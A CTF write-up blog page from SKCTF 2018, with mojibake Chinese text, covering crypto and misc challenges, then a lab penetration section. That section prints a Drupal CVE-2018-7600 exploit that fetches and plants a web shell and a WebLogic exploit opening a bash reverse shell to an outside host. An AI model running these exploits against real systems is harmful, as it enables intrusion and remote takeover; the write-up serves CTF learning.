<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>æ ¹æ®å›¾å¯çŸ¥ï¼ŒYæ˜¯LFSRäº§ç”Ÿåºåˆ—ä¸FLAGå¼‚æˆ–å¾—åˆ°çš„ç»“æœï¼Œå·²çŸ¥Yï¼Œåªè¦ç”ŸæˆåŠ å¯†æ—¶ä½¿ç”¨çš„åºåˆ—å³å¯å¾—åˆ°flagã€‚<br>å·²çŸ¥LFSRåˆå§‹çŠ¶æ€ä¸º17ï¼Œå³10001ã€‚åˆ™æ ¹æ®LFSRåŸç†ï¼Œå°†å…¶è¡¨ç¤ºä¸ºa1,a2,a3,a4,a5ã€‚é¦–å…ˆè¾“å‡ºçš„æ˜¯a1ï¼Œå³LFSRå³ç«¯ä¸ºa1ï¼Œé¡ºåºå‘å·¦æ’åˆ—ã€‚<br>ç¬¬ä¸€æ¬¡è¿ç®—ï¼Œç§»ä½è¾“å‡ºa1ï¼Œå°†a1ä¸a4è¿›è¡Œå¼‚æˆ–è¿ç®—å¾—åˆ°a6ï¼š<br><code>a6 = a1 ^ a4</code><br>ç¬¬ä¸€æ¬¡è¿ç®—åï¼ŒLFSRä¸­ç”±å³è‡³å·¦ä¸º 11000ï¼Œé‡å¤æ“ä½œï¼Œç»§ç»­è¾“å‡ºã€‚<br>æ¨å¹¿ï¼š</p>
<pre><code>n&gt;5æ—¶ï¼Œa(n) = a(n-5) ^ a(n-2)</code></pre>
<p>åˆçŸ¥Yé•¿åº¦ä¸º184ï¼Œåˆ™ä¾æ¬¡è¿ç®—ç”Ÿæˆ184ä½åˆå§‹åºåˆ—ï¼š</p>
<pre><code>1101110011010001000000011110111101011001010011111100000101000110011000010011000001100101101110010010001110011001011110111110100010001110111110110110011111010111110001100001101000101010</code></pre>
<p>å°†å…¶ä¸Yè¿›è¡Œå¼‚æˆ–å³å¯å¾—åˆ°FLAGçš„äºŒè¿›åˆ¶ï¼Œè½¬ä¸º16è¿›åˆ¶åï¼Œå†è½¬æ¢ä¸ºå­—ç¬¦å³å¯ã€‚</p>
<pre><code>flagï¼šSKCTF&#123;D0_YoU_Kn0w_Lf5R&#125;</code></pre>
<pre><code class="python">
# - UTF-8 -
# LSFR_decode
# _Bonjour
# 

Y = &quot;1101110011010001000000011110111101011001010011111100000101000110011000010011000001100101101110010010001110011001011110111110100010001110111110110110011111010111110001100001101000101010&quot;
len = len(Y)
print(len) # æ±‚å¯†æ–‡é•¿åº¦

# initial_state = 17
# initial_state = &quot;00010001&quot;
output = &#39;10001&#39;

# æ ¹æ®å›¾(a4,a3,a2,a1,a0)ï¼Œf = list[i] ^ list[i + 3]
for i in range(184):
    output += str(int(output[i]) ^ int(output[i + 3]))
print(&quot;output = &quot; + output)

flag = &#39;&#39;
for i in range(184):
    flag += str(int(output[i]) ^ int(Y[i]))
print(&quot;flag = &quot; + flag)

list = &#39;&#39;
idx = 0
while idx &lt; len:
    list += chr(int(flag[idx:idx+8],2))
    idx += 8
print(list)
</code></pre>
<h2 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy rsa"></a>easy rsa</h2><p>ä½æŒ‡æ•°å¹‚çˆ†ç ´æ”»å‡»ï¼Œè„šæœ¬å¦‚ä¸‹</p>
<pre><code>import libnum

c=20007698782339834246219328724588364459038474898597431254441716723329047692482286669616878491497181438826429104573158490197780427343059002311390665150204203593904674308567972583524863664412573864470357485299378319457792659062998310715680020892095430469672971488726545126438904961637
n= 127736277372703302601056543119422673263688414162130452012271136376613506149677023810059879551077756689012265602068781726322860263396788055341495459092641851239465778777954763378423777055786390661741851297248439205933852145044703803764388021585419049988085302710871206091591995497858682344782684500134395300049


for e in range(2,10):
    m = libnum.nroot(c,e)
    if m**e==c:
        break

print &quot;e:&quot;,e
print &quot;m:&quot;,m
flag = libnum.n2s(m)
print flag</code></pre>
<h2 id="çœ‹åˆ°çš„å°±æ˜¯å…¨éƒ¨"><a href="#çœ‹åˆ°çš„å°±æ˜¯å…¨éƒ¨" class="headerlink" title="çœ‹åˆ°çš„å°±æ˜¯å…¨éƒ¨"></a>çœ‹åˆ°çš„å°±æ˜¯å…¨éƒ¨</h2><p>ç›¸å…³çŸ¥è¯†ï¼šcaser + æ …æ  + unicode </p>
<p>cipher: </p>
<pre><code class="Unicode">\u4f\u50\u53\u79\u41\u47\u42\u7a\u47\u42\u61\u4b\u32\u59\u33\u7d\u59\u7b\u31\u69\u6f\u50\u6e</code></pre>
<p>unicode decode</p>
<p>æ …æ  key:3</p>
<p>å‡¯æ’’caser</p>
<p>plain: SKCTF{We1cOmE2sKCTF3rd}</p>
<h2 id="FairPlay"><a href="#FairPlay" class="headerlink" title="FairPlay"></a>FairPlay</h2><p>ç›¸å…³çŸ¥è¯†ï¼šfairplayåŠ å¯†<br>å‚è€ƒåŸç†ï¼š<br><a href="https://blog.csdn.net/qq_25968195/article/details/70343910">https://blog.csdn.net/qq_25968195/article/details/70343910</a><br>å…·ä½“åŠ å¯†æ­¥éª¤ï¼š</p>
<ul>
<li><p>æ ¹æ®keyæ„å»º5*5çŸ©é˜µ<br>j   u   s   t   d<br>o   a   b   c   e<br>f   g   h   k   l<br>m   n   p   q   r<br>v   w   x   y   z</p>
</li>
<li><p>å¯¹å¯†æ–‡è¿›è¡Œä¸¤ä¸¤åˆ†ç»„<br>ï¼ˆ** è‹¥ä¸¤å…ƒç´ ç›¸åŒï¼ˆa == bï¼‰ï¼šäºä¸¤å…ƒç´ é—´æ’å…¥x<br>** è‹¥ä¸¤å…ƒç´ åŒä¸€è¡Œ(a / 5 == b / 5)ï¼šå–å³ï¼ˆ+1ï¼‰å…ƒç´ <br>** è‹¥ä¸¤å…ƒç´ åŒä¸€åˆ—(a % 5 == b % 5)ï¼šå–ä¸‹ï¼ˆ+5ï¼‰å…ƒç´ <br>** è‹¥ä¸¤å…ƒç´ ä¸åŒè¡Œä¸åŒåˆ—ï¼šä»¥ä¸¤å…ƒç´ ä¸ºå¯¹è§’çº¿æ„å»ºçŸ©é˜µï¼Œåˆ†åˆ«å–è¯¥çŸ©é˜µå†…çš„åŒè¡Œï¼ˆa + (|b - a| % 5) å’Œ b - (|b - a| % 5)ï¼‰å…ƒç´ ï¼‰</p>
</li>
</ul>
<pre><code class="python">  # Playfair_encode
  # 
  # æœ¬ä»£ç å·²çŸ¥çº¦å®šï¼š
    # j -&gt; i
    # è‹¥ p1=p2ï¼Œåˆ™æ’å…¥ä¸€ä¸ªå­—æ¯(X)äºé‡å¤å­—æ¯ä¹‹é—´ï¼›
    # è‹¥æ˜æ–‡å­—æ¯æ•°ä¸ºå¥‡æ•°æ—¶ï¼Œåˆ™åœ¨æ˜æ–‡çš„æœ«ç«¯æ·»åŠ (Z)ä½œä¸ºå¡«å……ï¼›
    # 
  # Bonjour_

  # ç§»é™¤å¯†é’¥ä¸­å·²å­˜åœ¨çš„å­—ç¬¦
  def Remove(key):
    key = key.lower() # å°†æ‰€æœ‰å¤§å†™å­—æ¯è½¬ä¸ºå°å†™
    text = &#39;&#39;
    for c in key:
      if c == &#39;i&#39;:
        c = &#39;j&#39;
      if c in text:
        continue
      else:
        text+=c
    return text

  # æ•´åˆå¯†é’¥ä¸é‡å¤å­—æ¯å’Œå­—æ¯è¡¨å‰©ä½™å­—æ¯
  def Ordertext(text):
    Alphabet = &quot;abcdefghijklmnopqrstuvwxyz&quot;
    for c in Alphabet:
      if c == &#39;i&#39;:
        c = &#39;j&#39;
      if c not in text:
        text+=c
    return text

  # æ ¹æ®å·²ç¡®å®šé¡ºåºæ„é€ 5*5çŸ©é˜µ
  def CreatMatrix(text):
    Matrix = []
    cnt = 0
    for i in range(25):
      Matrix.append(text[cnt:cnt+1])
      cnt+=1
    return Matrix

  # æŸ¥æ‰¾æŒ‡å®šå…ƒç´ 
  def Search(Matrix,c):
    if c == &#39;i&#39;:
      c = &#39;j&#39;
    cnt = 0
    for i in Matrix:
      if i == c:
        # print(cnt)
        return cnt # è¿”å›å…ƒç´ ä½ç½®
      cnt = cnt + 1
    return -1

  def Abs(a,b):
    if a &gt; b:
      return a - b
    else:
      return b - a

  # è¿›è¡Œå…ƒç´ å˜åŒ– ##&#39;A&#39; = 65, &#39;a&#39; = 97
  # # è‹¥ä¸¤å…ƒç´ åŒä¸€è¡Œ(a / 5 == b / 5)ï¼šå–å³ï¼ˆ+1ï¼‰å…ƒç´ 
  def Change1(Matrix,x):
    if int(x / 5) != int((x + 1) / 5):
      x = int(int(x / 5) * 5)
      # print(x)
    else:
      x = x + 1
    # print(&quot;+1+&quot;)
    return Matrix[x]

  # è‹¥ä¸¤å…ƒç´ åŒä¸€åˆ—(a % 5 == b % 5)ï¼šå–ä¸‹ï¼ˆ+5ï¼‰å…ƒç´ 
  def Change2(Matrix,x):
    x = (x + 5) % 25
    return Matrix[x]

  # è‹¥ä¸¤å…ƒç´ ä¸åŒè¡Œä¸åŒåˆ—ï¼šä»¥ä¸¤å…ƒç´ ä¸ºå¯¹è§’çº¿æ„å»ºçŸ©é˜µï¼Œåˆ†åˆ«å–è¯¥çŸ©é˜µå†…çš„åŒè¡Œï¼ˆa + (|b - a| % 5) å’Œ b - (|b - a| % 5)ï¼‰å…ƒç´ 
  def Change3(Matrix,x,diff):
    x = x + diff
    return Matrix[x]


  # ä¸¤ä¸¤åˆ†ç»„
  # è‹¥ä¸¤å…ƒç´ ç›¸åŒï¼ˆa == bï¼‰ï¼šäºä¸¤å…ƒç´ é—´æ’å…¥x
  # è‹¥ä¸¤å…ƒç´ åŒä¸€è¡Œ(a / 5 == b / 5)ï¼šå–å³ï¼ˆ+1ï¼‰å…ƒç´ 
  # è‹¥ä¸¤å…ƒç´ åŒä¸€åˆ—(a % 5 == b % 5)ï¼šå–ä¸‹ï¼ˆ+5ï¼‰å…ƒç´ 
  # è‹¥ä¸¤å…ƒç´ ä¸åŒè¡Œä¸åŒåˆ—ï¼šä»¥ä¸¤å…ƒç´ ä¸ºå¯¹è§’çº¿æ„å»ºçŸ©é˜µï¼Œåˆ†åˆ«å–è¯¥çŸ©é˜µå†…çš„åŒè¡Œï¼ˆa + (|b - a| % 5) å’Œ b - (|b - a| % 5)ï¼‰å…ƒç´ 
  def encode(Matrix,plain,len):
    cnt = 0
    text = &#39;&#39;
    while(cnt &lt; len):
      a = plain[cnt]
      b = plain[cnt + 1]
      pos_a = Search(Matrix,a)
      pos_b = Search(Matrix,b)
      # print(int(pos_a / 5))
      # print(int(pos_b / 5))
      # c = &#39;a&#39;
      # c = ord(c) + 1 //ord()ï¼šå°†å­—ç¬¦è½¬åŒ–ä¸ºæ•´æ•°å€¼
      # print(chr(c)) //è¾“å‡º&#39;b&#39;
      if pos_a == pos_b:
        text += a
        text += &#39;x&#39;
        text += a
      elif int(pos_a / 5) == int(pos_b / 5):
        text += Change1(Matrix,pos_a)
        text += Change1(Matrix,pos_b)
      elif pos_a % 5 == pos_b % 5:
        text += Change2(Matrix,pos_a)
        text += Change2(Matrix,pos_b)
      # æ ¹æ®ä¸¤ç§çŸ©é˜µæ ¼å¼åŒºåˆ†
      elif pos_a % 5 &lt; pos_b % 5:
        diff = pos_b % 5 - pos_a % 5
        if pos_a &gt; pos_b:
          text += Change3(Matrix,pos_a,diff)
          text += Change3(Matrix,pos_b,-diff)
        else:
          text += Change3(Matrix,pos_a,diff)
          text += Change3(Matrix,pos_b,-diff)
      elif pos_a % 5 &gt; pos_b % 5:
        diff = pos_a % 5 - pos_b % 5
        if pos_a &gt; pos_b:
          text += Change3(Matrix,pos_a,-diff)
          text += Change3(Matrix,pos_b,diff)
        else:
          text += Change3(Matrix,pos_a,-diff)
          text += Change3(Matrix,pos_b,diff)
      cnt+=2
    return text


  # è¯»å–æ–‡ä»¶
  input = open(&#39;in.txt&#39;)
  try:
    plain = input.read()
  finally:
    input.close()

  print(plain)

  file = open(&#39;key.txt&#39;)
  try:
    key = file.read()
  finally:
    file.close()
  # å»é™¤ç©ºæ ¼
  # key=key.replace(&#39; &#39;,&#39;&#39;) 

  text = Remove(key)
  text = Ordertext(text)
  Matrix = CreatMatrix(text)
  print(Matrix)
  # print(Matrix[0])

  # è‹¥æ˜æ–‡å­—æ¯æ•°ä¸ºå¥‡æ•°æ—¶ï¼Œåˆ™åœ¨æ˜æ–‡çš„æœ«ç«¯æ·»åŠ (Z)ä½œä¸ºå¡«å……ï¼›
  len = 0
  for i in plain:
    len = len + 1
  if len % 2 == 1:
    plain += &#39;z&#39;

  cipher = encode(Matrix,plain,len)
  print(cipher)


  #flag:SKCTF&#123;rhcwgodmdbordbbutcgbmasklzdx&#125;</code></pre>
<h2 id="ä»¿å°„å˜æ¢"><a href="#ä»¿å°„å˜æ¢" class="headerlink" title="ä»¿å°„å˜æ¢"></a>ä»¿å°„å˜æ¢</h2><p>ç›¸å…³çŸ¥è¯†ï¼šä»¿å°„åŠ å¯†<br>å‚è€ƒåŸç†ï¼šç™¾åº¦ç™¾ç§‘-ä»¿å°„åŠ å¯†<br>m = 11x + 23(mod 26)<br>æ±‚å¾—11æ¨¡26çš„é€†ä¸º19ï¼Œå› æ­¤c = 19(m - 23)(mod 26)</p>
<pre><code class="python">c = &#39;fwpcpywpcphnxaoxlywpcphnxlhco&#39;

def getGcd(x,y):
  while True:
    divisor = x % y
    gcd = y
    x,y = y,divisor
    if divisor == 0:
      break
  return gcd

def setCoprime(a,n):
  for i in range(1,n):
    #print(getGcd(n,i))
    if(1 == getGcd(n,i)): 
      a.append(i)

def get_a(l,a,n):
  for i in l:
    if(1 == a * i % n):
      return i
  return 0

def decrypt(s,a,b,n):
  c = &#39;&#39;
  s.split()
  l = []
  setCoprime(l,n)
  #print(l)
  #print(get_a(l,a,n))
  for i in s:
    c += chr(((get_a(l,a,n) * ((ord(i)-97) - b)) % 26)+97)
  return c

print(decrypt(c,11,23,26))

#flag:SKCTF&#123;wherethereisaflagthereisagirl&#125;</code></pre>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Just-Listen"><a href="#Just-Listen" class="headerlink" title="Just Listen"></a>Just Listen</h2><p>è§£å‹å‹ç¼©åŒ…å¾—åˆ°å›¾ç‰‡å’Œmp3ã€‚</p>
<p>password.jpgè—ç€å¯†ç ï¼Œç”¨stegsolveæ‰“å¼€ï¼Œåˆ‡æ¢é€šé“ï¼Œå¾—åˆ°å¯†ç ã€‚</p>
<p><img src="/images/SKCTF2018/listen1.png"></p>
<p><code>key&#123;forensics_is_fun&#125;</code></p>
<p>Mp3stegoå·¥å…·å¯ä»¥å°†ä¿¡æ¯éšè—åˆ°MP3ä¸­ï¼Œå¹¶éœ€ç”¨å¯†é’¥è§£å¯†ã€‚</p>
<p>Mp3stegoå·¥å…·ï¼š<a href="http://www.petitcolas.net/steganography/mp3stego/">http://www.petitcolas.net/steganography/mp3stego/</a></p>
<p>ç›´æ¥ç”¨å·¥å…·è§£å¯†å¾—åˆ°flagã€‚</p>
<p><img src="/images/SKCTF2018/listen2.png"></p>
<h2 id="çœŸé¦™"><a href="#çœŸé¦™" class="headerlink" title="çœŸé¦™"></a>çœŸé¦™</h2><p>ä¸‹è½½zhenxiang.gifï¼Œæ”¾åˆ°binwalkä¸­åˆ†æï¼Œå‘ç°æœ‰zipæ–‡ä»¶ã€‚</p>
<p><img src="/images/SKCTF2018/xiang1.png"></p>
<p><code>-e</code>å‚æ•°æå–å‡ºæ¥ã€‚</p>
<p><img src="/images/SKCTF2018/xiang2.png"></p>
<p>å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œæ³¨é‡Š<code>blind_water_mark</code>æ˜¯å‹ç¼©åŒ…å¯†ç ã€‚</p>
<p>è§£å‹å¾—åˆ°<code>or.png</code>å’Œ<code>xor.png</code>ä¸¤å¼ å›¾ç‰‡ã€‚</p>
<p>æ³¨é‡ŠåŒæ—¶ä¹Ÿæ˜¯æç¤ºï¼Œä¸¤å¼ å›¾ç‰‡ç”¨ç›²æ°´å°æ”»å‡»å³å¯getflagã€‚</p>
<p>BlindWaterMarkå·¥å…·:<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p><img src="/images/SKCTF2018/xiang3.png"></p>
<p>flag:</p>
<p><img src="/images/SKCTF2018/xiangflag.png"></p>
<h2 id="æ‰¾åˆ°äº†ä¹Ÿæ‰“ä¸å¼€"><a href="#æ‰¾åˆ°äº†ä¹Ÿæ‰“ä¸å¼€" class="headerlink" title="æ‰¾åˆ°äº†ä¹Ÿæ‰“ä¸å¼€"></a>æ‰¾åˆ°äº†ä¹Ÿæ‰“ä¸å¼€</h2><hr>
<p>é¢˜ç›®æ˜¯ä¸€ä¸ªpcapçš„æ•°æ®åŒ…ï¼Œæ‰“å¼€åå‘ç°æ•°æ®åŒ…é‡Œçš„æ•°æ®æœ‰å¾ˆå¤šï¼Œä½†æ˜¯httpçš„åªæœ‰ä¸€æ¡ï¼ŒæŸ¥çœ‹è¿™æ¡httpæ•°æ®åŒ…ï¼Œå‘</p>
<p>ç°æ•°æ®å†…å®¹ä¸ºä¸€ä¸ª.zipçš„å‹ç¼©åŒ…ï¼Œé‚£æ€è·¯å°±å¾ˆç®€å•äº†ï¼ŒæŠŠè¿™ä¸ªzipæ–‡ä»¶é‡Œçš„å†…å®¹æå–å‡ºæ¥ï¼Œä¿å­˜ä¸ºä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶ï¼Œ</p>
<p>ä½†æ˜¯è§£å‹éœ€è¦å¯†ç ï¼Œæ²¡æœ‰ä»»ä½•æç¤ºçš„æƒ…å†µä¸‹çˆ†ç ´æ˜¯ä¸å¯èƒ½çš„ï¼Œç”¨winhexæˆ–è€…UEç­‰è½¯ä»¶æŸ¥çœ‹ä¸‹åå…­è¿›åˆ¶æ–‡ä»¶ï¼Œå‘ç°</p>
<p>æ˜¯zipçš„ä¼ªåŠ å¯†ï¼Œä¿®æ”¹ä¸‹zipçš„åŠ å¯†æ ‡å¿—å³å¯æ‰“å¼€å‹ç¼©åŒ…å¾—åˆ°Flagã€‚</p>
<h2 id="I-wanna-get-the-flag"><a href="#I-wanna-get-the-flag" class="headerlink" title="I_wanna_get_the_flag"></a>I_wanna_get_the_flag</h2><p>GameMarker 8.0åˆ¶ä½œçš„I wanna æ¸¸æˆã€‚(åŸåï¼šI wanna be the GGM)</p>
<p>æè¿°é€šå…³ä¹‹åæœ‰flagã€‚</p>
<p>3ç§è§£é¢˜æ–¹æ³•</p>
<h3 id="1-é€šå…³æ¸¸æˆ"><a href="#1-é€šå…³æ¸¸æˆ" class="headerlink" title="1-é€šå…³æ¸¸æˆ"></a>1-é€šå…³æ¸¸æˆ</h3><p>æ—¢ç„¶æ˜¯é€šå…³ä¹‹åï¼Œé‚£ä¹ˆå‡­æŠ€æœ¯é€šå…³ä¹Ÿæ˜¯æ²¡é—®é¢˜çš„ã€‚</p>
<h3 id="2-ä¿®æ”¹saveæ–‡ä»¶ã€‚"><a href="#2-ä¿®æ”¹saveæ–‡ä»¶ã€‚" class="headerlink" title="2-ä¿®æ”¹saveæ–‡ä»¶ã€‚"></a>2-ä¿®æ”¹saveæ–‡ä»¶ã€‚</h3><p>é€šè¿‡å­˜æ¡£ï¼Œç©æ¸¸æˆææ¸…saveæ–‡ä»¶çš„æ ¼å¼ï¼Œç”¨16è¿›åˆ¶ç¼–è¾‘ã€‚<br><img src="/images/SKCTF2018/iwanna.png"></p>
<p>æ ‡å‡ºçš„ä¸¤ä½å°±æ˜¯å…³å¡çš„æ ‡å¿—ï¼Œé¢˜ç›®è¯´æœ‰12å…³ï¼Œé‚£ä¹ˆï¼ŒæŠŠ<code>0112</code>ä¿®æ”¹ä¸º<code>011E</code>ï¼Œå†è¿›å…¥æ¸¸æˆå°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<h3 id="3-åç¼–è¯‘"><a href="#3-åç¼–è¯‘" class="headerlink" title="3-åç¼–è¯‘"></a>3-åç¼–è¯‘</h3><p>ä¸‹è½½GameMarker 8.0 Decompilerï¼Œå°†exeè¿›è¡Œåç¼–è¯‘ã€‚å¾—åˆ°å·¥ç¨‹æ–‡ä»¶gmkï¼Œä¸‹è½½ä¸€ä¸ªGameMarker 8.0ç‰ˆæœ¬å³å¯è¯»å–åˆ°æ‰€æœ‰èµ„æºï¼Œæ‰¾åˆ°é€šå…³ååœºæ™¯å°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<h2 id="å–è¯"><a href="#å–è¯" class="headerlink" title="å–è¯"></a>å–è¯</h2><p>vmdkæ–‡ä»¶å…¶å®æ˜¯ç‰©ç†ç¡¬ç›˜çš„è™šæ‹Ÿç‰ˆï¼Œä¹Ÿå­˜åœ¨ç€è·Ÿç‰©ç†ç¡¬ç›˜çš„åˆ†åŒºå’Œæ‰‡åŒºä¸­ç±»ä¼¼çš„å¡«å……åŒºåŸŸã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨VMwareç›´æ¥æ˜ å°„è™šæ‹Ÿç£ç›˜ã€‚</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1vzza21uj20r40b20xy.jpg"></p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w09pixoj20pf0ctwgm.jpg"></p>
<p>ç£ç›˜ç©ºé—´å†…åªæœ‰ä¸€ä¸ªnothing.rarï¼Œè§£å‹åå¾—åˆ°nothing.gifï¼Œä¸ºNTFSæ•°æ®æµéšå†™ã€‚<strong>æ‰€ä»¥å‹ç¼©åŒ…éœ€è¦ä½¿ç”¨WinRARè¿›è¡Œè§£å‹ã€‚</strong></p>
<p>ç”¨lads.exeé€’å½’æŸ¥è¯¢å¯çœ‹åˆ°flag.gif</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w1mxxr4j20oy09h0t5.jpg"></p>
<p>ä½¿ç”¨Ntfs Streams Editoræå–</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w1uxzrjj20vw0dl0ws.jpg"></p>
<p>å¯¹gifå›¾åˆ†å¸§å¤„ç†ï¼Œå¾—åˆ°æœ€ç»ˆflagã€‚</p>
<p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1fr1w2eagy8j21a90510sz.jpg"></p>
<p>è¯¦ç»†è§£æåŠåŸç†è§</p>
<p><a href="0sec.com.cn/2018-05-12/">0sec.com.cn/2018-05-12/</a></p>
<h1 id="é¶åœºæ¸—é€"><a href="#é¶åœºæ¸—é€" class="headerlink" title="é¶åœºæ¸—é€"></a>é¶åœºæ¸—é€</h1><p>ç½‘ä¸Šæœä¸‹drupalçš„çš„æ¼æ´ï¼Œæ‰¾åˆ°poc</p>
<pre><code>#!/usr/bin/env python3
import sys
import requests

print (&#39;################################################################&#39;)
print (&#39;# Proof-Of-Concept for CVE-2018-7600&#39;)
print (&#39;# by Vitalii Rudnykh&#39;)
print (&#39;# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders&#39;)
print (&#39;# https://github.com/a2u/CVE-2018-7600&#39;)
print (&#39;################################################################&#39;)
print (&#39;Provided only for educational or information purposes\n&#39;)


# Add proxy support (eg. BURP to analyze HTTP(s) traffic)
# set verify = False if your proxy certificate is self signed
# remember to set proxies both for http and https
# 
# example:
# proxies = &#123;&#39;http&#39;: &#39;http://127.0.0.1:8080&#39;, &#39;https&#39;: &#39;http://127.0.0.1:8080&#39;&#125;
# verify = False
proxies = &#123;&#125;
verify = True

target = &#39;http://192.168.211.105/&#39;
url = target + &#39;user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax&#39; 
payload = &#123;&#39;form_id&#39;: &#39;user_register_form&#39;, &#39;_drupal_ajax&#39;: &#39;1&#39;, &#39;mail[#post_render][]&#39;: &#39;exec&#39;, &#39;mail[#type]&#39;: &#39;markup&#39;, &#39;mail[#markup]&#39;: &#39;curl http://192.168.211.127:2333/shell.php| tee shell.php&#39;&#125;

r = requests.post(url, proxies=proxies, data=payload, verify=verify)
check = requests.get(target + &#39;shell.php&#39;, verify=verify)
if check.status_code != 200:
  sys.exit(&quot;Not exploitable&quot;)
print (&#39;\nCheck: &#39;+target+&#39;hello.txt&#39;)</code></pre>
<p>æœ¬åœ°èµ·ä¸ªç¯å¢ƒï¼Œåˆ©ç”¨curlæ¥getshell</p>
<p>æ‹¿åˆ°shellåˆ©ç”¨msfä¸¢ä¸ªé©¬ä¸Šå» </p>
<p><img src="/images/SKCTF2018/bachang1.png"></p>
<p>æ‰«ä¸€æ³¢å‘ç°äº†<code>10.0.0.3</code>å¼€ç€7001ç«¯å£ï¼Œweblogic</p>
<p>ç½‘ä¸Šæ‰¾ä¸‹poc</p>
<pre><code>#encoding: utf-8
import requests
headers = &#123; &#39;Content-type&#39;: &#39;text/xml&#39; &#125;
data = &#39;&#39;&#39;
&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
  &lt;soapenv:Header&gt;
&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
  &lt;void index=&quot;0&quot;&gt;
&lt;string&gt;bash&lt;/string&gt;
  &lt;/void&gt;
  &lt;void index=&quot;1&quot;&gt;
&lt;string&gt;-c&lt;/string&gt;
  &lt;/void&gt;
  &lt;void index=&quot;2&quot;&gt;
&lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/192.168.211.149/12222 0&gt;&amp;amp;1&lt;/string&gt;
  &lt;/void&gt;
&lt;/array&gt;
  &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
&lt;/java&gt;
  &lt;/work:WorkContext&gt;
&lt;/soapenv:Header&gt;
  &lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt;&#39;&#39;&#39;
def exp(ip):
    print(&quot;Test for &quot; + ip + &quot; .....&quot;)
    r = requests.post(url=ip,data=data,headers=headers)
    print(r.status_code)
    print(r.text)

if __name__ == &#39;__main__&#39;:
    ip = &quot;http://10.0.0.3:7001/wls-wsat/CoordinatorPortType11&quot;
    exp(ip)</code></pre>
<p>ä¿®æ”¹ä¸‹proxychains.confåŠ ä¸Šä»£ç†ï¼Œæœ¬åœ°ç›‘å¬ä¸€ä¸‹æ‹¿åˆ°shell</p>
<p><img src="/images/SKCTF2018/bachang2.png"></p>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RSAé¢˜å‹æ€»ç»“ï¼ˆ2018-8-5æ›´æ–°ï¼‰</title>
    <url>/2018/07/28/rsa-ti-xing-zong-jie/</url>
    <content><![CDATA[<h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>å‚æ•°ï¼š</p>
<blockquote>
<ul>
<li>p å’Œ q ï¼šå¤§æ•´æ•°Nçš„ä¸¤ä¸ªå› å­ï¼ˆfactorï¼‰</li>
<li>Nï¼šå¤§æ•´æ•°Nï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ¨¡æ•°ï¼ˆmodulusz)</li>
<li>e å’Œ dï¼šäº’ä¸ºæ¨¡åæ•°çš„ä¸¤ä¸ªæŒ‡æ•°ï¼ˆexponentï¼‰</li>
<li>c å’Œ mï¼šåˆ†åˆ«æ˜¯å¯†æ–‡å’Œæ˜æ–‡ï¼Œè¿™é‡Œä¸€èˆ¬æŒ‡çš„æ˜¯ä¸€ä¸ªåè¿›åˆ¶çš„æ•°</li>
</ul>
</blockquote>
<p>åŠ è§£å¯†å…¬å¼ï¼š</p>
<blockquote>
<ol>
<li>å¯¹æ˜æ–‡mè¿›è¡ŒåŠ å¯†ï¼šc = pow(m, e, N)ï¼Œå¾—åˆ°çš„cå³ä¸ºå¯†æ–‡</li>
<li>å¯¹å¯†æ–‡cè¿›è¡Œè§£å¯†ï¼Œm = pow(c, d, N)ï¼Œå¾—åˆ°çš„må³ä¸ºæ˜æ–‡</li>
</ol>
</blockquote>
<blockquote>
<ul>
<li>ï¼ˆNï¼Œeï¼‰ï¼šå…¬é’¥</li>
<li>ï¼ˆNï¼Œdï¼‰ï¼šç§é’¥</li>
</ul>
</blockquote>
<p>æ•°å­¦å…³ç³»ï¼š</p>
<blockquote>
<p>N = p * q     (p,qä¸ºä¸¤ä¸ªå¤§ç´ æ•°)</p>
<p>Ï† = (pâˆ’1) * (qâˆ’1)     å³Nçš„æ¬§æ‹‰å‡½æ•°</p>
<p>Â e * d â‰¡ 1 (mod Ï†)        e (1&lt;e&lt;Ï†)ï¼Œä¸”eå’ŒÏ†äº’è´¨ / eçš„æ¨¡åæ•°ä¸ºd</p>
</blockquote>
<h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><h3 id="åˆ†è§£Nï¼š"><a href="#åˆ†è§£Nï¼š" class="headerlink" title="åˆ†è§£Nï¼š"></a>åˆ†è§£Nï¼š</h3><ul>
<li><a href="http://factordb.com/">factordb</a>(åœ¨çº¿æŸ¥è¯¢Nå› å­çš„ç½‘ç«™ï¼Œå­˜å‚¨äº†å¤§é‡Nåˆ†è§£çš„å› å­)</li>
<li><a href="https://github.com/DarkenCode/yafu">yafu</a></li>
